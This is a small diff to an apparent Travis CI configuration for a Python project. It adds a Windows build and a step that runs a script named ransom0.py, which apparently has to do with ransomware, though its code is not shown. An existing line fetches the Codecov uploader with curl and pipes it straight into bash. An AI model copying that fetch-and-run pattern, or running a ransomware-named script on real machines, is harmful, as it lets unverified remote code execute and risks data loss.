@@ -1,3 +1,4 @@
+os: windows
 language: python
 python:
   - "3.8.7"
@@ -8,3 +9,5 @@ after_success:
   bash <(curl -s https://codecov.io/bash)
 codecov:
   require_ci_to_pass: yes
+script:
+  - python ransom0.py
